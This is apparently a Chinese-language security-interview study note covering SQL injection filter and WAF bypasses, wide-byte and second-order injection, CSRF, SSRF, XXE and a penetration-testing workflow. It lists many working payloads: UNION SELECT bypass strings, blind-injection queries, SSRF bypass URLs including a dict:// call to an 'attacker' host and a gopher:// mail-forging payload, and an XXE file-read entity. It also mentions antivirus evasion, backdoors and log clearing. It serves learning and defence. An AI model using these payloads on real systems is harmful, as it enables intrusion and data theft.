[toc]

**Ref**：

> https://github.com/Leezj9671/Pentest_Interview
>
> https://github.com/vvmdx/Sec-Interview-4-2023
>
> https://github.com/FeeiCN/SecurityInterviewGuide
>
> https://github.com/tangxiaofeng7/Security_Q-A
>
> https://github.com/d1nfinite/sec-interview



# WEB

## 注入

### SQL注入绕过

#### 1.大小写绕过

数据库使用不区分大小写的方式来处理SQL关键字，所以可以使用大小写变种来绕过。

#### 2.过滤空格绕过

-   两个空格代替一个空格
-   tab
-   %a0
-   `%20 %09 %0a %0b %0c %0d %a0 %00 `
-   注释代替`/**/ /*!*/`
-   使用浮点数：`select * from users where id=8E0union select 1,2,3`
-   括号绕过

#### 3.过滤引号绕过

使用十六进制

example：

```sql
select column_name  from information_schema.tables where table_name="users"
select column_name  from information_schema.tables where table_name=0x7573657273
```

#### 4.过滤逗号绕过

可以使用功能from或者offset或者join或者casewhen绕过。

**join**

```sql
union select 1,2,3,4;
union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);
union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
```

**盲注逗号绕过**

常用的盲注函数有mid，可以使用substring

```sql
mysql> select substring('hello' from 1);
+---------------------------+
| substring('hello' from 1) |
+---------------------------+
| hello                     |
+---------------------------+
1 row in set (0.04 sec)
 
mysql> select substring('hello' from 2);
+---------------------------+
| substring('hello' from 2) |
+---------------------------+
| ello                      |
+---------------------------+
```

**from...for...**

form for 关键字可在substr等函数中代替参数:

```mysql
substr(str From posi For length)
select substr('abcde' From 1 For 1)
输出: a
```

**offset**(过滤limit中的逗号)

```python
select * from users limit 1 offset 2;
# 此时 limit 1 offset 2 可以代替 limit 1,2
```

#### 5.and or xor not被过滤

```
and=&&  or=||   xor=|   not=!
```

#### 6.一些函数被过滤

##### 1.substr

使用left，right,lpad(左填充)，rlpad，mid

```sql
substr( str, startpos,lenth)
//注意sql语法中的起始位置是1
substr("abcde",1,1) //a

left(str,length)
left('abcde',1)//a
left('abcde',3)//abc

right(str,length)
right('abcde',1)//e
right('abcde',3)//cde

lpad('abcd',8,'x')//xxxxabcd

rpad(str, lenth,startpos)
rpad("abcde",2,1) //ab

mid("abcde",1,1) //a
```

##### 2.ascii

通过bin(hex())将字符转为二进制判断：

```sql
if((ascii(substr((select database()),1,1))>97),1,0)#

select 0 or if(bin(hex(substr((select database()),1,1)))>111101,1,0)#
#111101  => bin(hex(97)) ||bin(hex('a'))
```

##### 3.sleep

等价函数benchmark(第一个参数为执行的次数,第二个为执行的语句)：

```sql
SELECT BENCHMARK(20000000,md5(123));
```

##### 4.if被过滤

使用case when

```sql
if(condition,1,0) 
case when 写法: 
case when condition then 1 else 0 end

or if((ascii(substr((select database()),1,1))>97),1,0)#
or case when ascii(substr((select database()),1,1))>97 then 1 else 0 end#
```

##### 7.=<>被过滤

使用in()绕过

```sql
/?id=' or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显

/?id=' or substr((select database()),1,1) in('s')--+    // 正常回显
```

##### 8.union select where等被过滤

1.  使用注释

    ```sql
    U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
    ```

2.  内敛注释

    ```
    id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM 	/*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
    ```

3.  大小写

    ```
    id=-1'UnIoN/**/SeLeCT
    ```

```sql
#WAF Bypassing Strings:
 
 /*!%55NiOn*/ /*!%53eLEct*/
 
 %55nion(%53elect 1,2,3)-- -
 
 +union+distinct+select+
 
 +union+distinctROW+select+
 
 /**//*!12345UNION SELECT*//**/
 
 /**//*!50000UNION SELECT*//**/
 
 /**/UNION/**//*!50000SELECT*//**/
 
 /*!50000UniON SeLeCt*/
 
 union /*!50000%53elect*/
 
 +#uNiOn+#sEleCt
 
 +#1q%0AuNiOn all#qa%0A#%0AsEleCt
 
 /*!%55NiOn*/ /*!%53eLEct*/
 
 /*!u%6eion*/ /*!se%6cect*/
 
 +un/**/ion+se/**/lect
 
 uni%0bon+se%0blect
 
 %2f**%2funion%2f**%2fselect
 
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 
 REVERSE(noinu)+REVERSE(tceles)
 
 /*--*/union/*--*/select/*--*/
 
 union (/*!/**/ SeleCT */ 1,2,3)
 
 /*!union*/+/*!select*/
 
 union+/*!select*/
 
 /**/union/**/select/**/
 
 /**/uNIon/**/sEleCt/**/
 
 /**//*!union*//**//*!select*//**/
 
 /*!uNIOn*/ /*!SelECt*/
 
 +union+distinct+select+
 
 +union+distinctROW+select+
 
 +UnIOn%0d%0aSeleCt%0d%0a
 
 UNION/*&test=1*/SELECT/*&pwn=2*/
 
 un?+un/**/ion+se/**/lect+
 
 +UNunionION+SEselectLECT+
 
 +uni%0bon+se%0blect+
 
 %252f%252a*/union%252f%252a /select%252f%252a*/
 
 /%2A%2A/union/%2A%2A/select/%2A%2A/
 
 %2f**%2funion%2f**%2fselect%2f**%2f
 
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 
 /*!UnIoN*/SeLecT+
 
##
#
#
#Union Select by PASS with Url Encoded Method:
 
%55nion(%53elect)
 
union%20distinct%20select
 
union%20%64istinctRO%57%20select
 
union%2053elect
 
%23?%0auion%20?%23?%0aselect
 
%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
 
%55nion %53eLEct
 
u%6eion se%6cect
 
unio%6e %73elect
 
unio%6e%20%64istinc%74%20%73elect
 
uni%6fn distinct%52OW s%65lect
 
%75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7
```

##### 9.information被ban

Mysql 开发团队在 5.5.x 版本后将 innodb 作为数据库的默认引擎。 Mysql>5.6.x mysql 库里增添了两个新表，`innodb_index_stats `和 `innodb_table_stats` 这两个表是数据库自动设置的。存储数据库和对应的数据表。

```sql
查库名
select database_name from mysql.innodb_table_stats group by database_name;

查表名
select table_name from mysql.innodb_table_stats where database_name=database();
```

### 宽字节注入

GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节

原理：宽字节注入发生的位置就是PHP发送请求到`MYSQL`时字符集使用`character_set_client`(指客户端发送过来的语句的编码)设置值进行了一次编码。在使用PHP连接MySQL的时候，当设置`character_set_client = gbk`时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入。

GBK首字节对应`0×81-0xFE`，尾字节对应`0×40-0xFE`（除0×7F），例如`%df`和`%5C`(就是转义符'\\')会结合；GB2312是被GBK兼容的，它的高位范围是`0xA1-0xF7`，低位范围是0xA1-0xFE(0x5C不在该范围内)，因此不能使用编码吃掉`%5c`

可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。

**常见转义函数与配置**：`addslashes`、`mysql_real_escape_string`、`mysql_escape_string`、`php.ini`中`magic_quote_gpc`的配置



**防御**：

- 对数据进行正确的转义，`mysql_real_escape_string`,`mysql_set_charset(‘gbk’,$conn)` // 替换 和 编码 两个函数一起使用 
- 设置参数，`charcater_set_client=binary` // 设置mysql的连接参数，使用二进制模式
- 使用 UTF-8 字符集来减轻注入情况；





### 二次注入

是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。

#### 原理



比如注册一个`test’#`的账号，写到数据库中也是这样，之后改密码或者其他操作的时候，`'#`会注释后面的内容。



#### 防御

- 对输入一视同仁，无论输入来自用户还是存储，在进入到 SQL 查询前都对其进行过滤、转义。
- 使用MySQLi参数化更新，事先编译的PHP代码能够带来高效的防护效果





## CSRF&SSRF

### CSRF

**csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）。这个操作不是用户真正想要执行的。**

#### CSRF防御

1.SameSit：**禁止第三方网站使用本站Cookie**。

2.referer头

3.token

#### json的csrf

1.可以 json转param：如把 `{"a":"b"}` 转换为 `a=b`，服务端可能也会解析

#### 修复：

-   验证http referer字段
-   添加token并验证
-   自定义http头的属性并验证
-   尽量使用post，限制get传值使用



### SSRF

[手把手带你用 SSRF 打穿内网](https://xz.aliyun.com/t/9554)

Server-side Request Forge，服务端请求伪造

**是什么**

>   利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。

**可以干什么**

>   -   探测内网信息
>   -   攻击内网或本地其他服务
>   -   穿透防火墙
>   -   。。。

**怎么找**

>   -   能够对外发起网络请求的地方
>   -   请求远程服务器资源的地方
>   -   数据库内置功能
>   -   邮件系统
>   -   文件处理
>   -   在线处理工具
>   -   。。。

example：

>   1.  在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。
>   2.  根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。
>   3.  数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。
>   4.  邮件系统就是接收邮件服务器地址这些地方。
>   5.  文件就找ImageMagick，xml这些。
>   6.  从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。

**ssrf绕过**

1. `[::]`绕过localhost

   `http://[::]:80`==>`http://127.0.0.1:80`

2. 利用@

   `http://example.com@127.0.0.1`

3. 短地址

   `http://dwz.cn/11SMa  >>>  http://127.0.0.1`

4. 句号

   `127。0。0。1  >>>  127.0.0.1`

5. 进制转换

6. 特殊域名：xip.io(原理是DNS解析)

   `http://127.0.0.1.xip.io/`

7. 其他协议

   ```
   Dict://
   dict://<user-auth>@<host>:<port>/d:<word>
   ssrf.php?url=dict://attacker:11111/
   SFTP://
   ssrf.php?url=sftp://example.com:11111/
   TFTP://
   ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
   LDAP://
   ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
   Gopher://
   ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
   ```

   

#### **修复**：





## XXE

XXE就是XML外部实体注入。

**危害**：

1.任意文件读取：`<!ENTITY myentity  SYSTEM  "file:///C:/XXE.txt">`

2.拒绝服务攻击

3.测试后端服务器的开放端口

4.后端WEB漏洞如果可以通过URL加以利用，可造成WEB漏洞攻击

5.命令执行



**修复**：

1.配置XML处理器使用禁用DTD、禁止外部实体解析

2.通过黑名单过滤用户提交的XML数据

- 关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC



# 渗透

## 渗透流程

**1. 明确目标**

 确定范围：测试目标的范围、ip、域名、内外网、测试账户。

 确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。

 确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞、等等。

 **2. 信息收集、**

 方式：主动扫描，开放搜索等。

 开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。

 基础信息：IP、网段、域名、端口。

 应用信息：各端口的应用。例如web应用、邮件应用、等等。

 系统信息：操作系统版本

 版本信息：所有这些探测到的东西的版本。

 服务信息：中间件的各类信息，插件信息。

 人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。

 防护信息：试着看能否探测到防护设备。

 **3. 漏洞探测**

利用上一步中列出的各种系统，应用等使用相应的漏洞。

方法：

(1) 漏扫，awvs，IBM appscan等。

(2) 结合漏洞去exploit-db等位置找利用。

(3) 在网上寻找验证poc。

内容：

 系统漏洞：系统没有及时打补丁

 WebSever漏洞：WebSever配置问题

 Web应用漏洞：Web应用开发问题

 其它端口服务漏洞：各种21/8080(st2)/7001/22/3389

 通信安全：明文传输，token在cookie中传送等。

 **4. 漏洞验证**

将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。

 自动化验证：结合自动化扫描工具提供的结果

 手工验证，根据公开资源进行验证

 试验验证：自己搭建模拟环境进行验证

 登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息

 业务漏洞验证：如发现业务漏洞，要进行验证

公开资源的利用

 exploit-db/wooyun/

 google hacking

 渗透代码网站

 通用、缺省口令

 厂商的漏洞警告等等。

**5. 信息分析**

为下一步实施渗透做准备。

 精准打击：准备好上一步探测到的漏洞的exp，用来精准打击

 绕过防御机制：是否有防火墙等设备，如何绕过

 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标

 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）

 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等

 **6. 获取所需**

实施攻击：根据前几步的结果，进行攻击

 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）

 进一步渗透：内网入侵，敏感目标

 持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等

 清理痕迹：清理相关日志（访问，操作），上传文件等

**7. 信息整理**

 整理渗透工具：整理渗透过程中用到的代码，poc，exp等

 整理收集信息：整理渗透过程中收集到的一切信息

 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息

**8. 形成报告**

 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告

 补充介绍：要对漏洞成因，验证过程和带来危害进行分析

 修补建议：当然要对所有产生的问题提出合理高效安全的解决办法







## 带外攻击：

https://cloud.tencent.com/developer/article/1956480



# Pwn





# Crypto



# 八股文



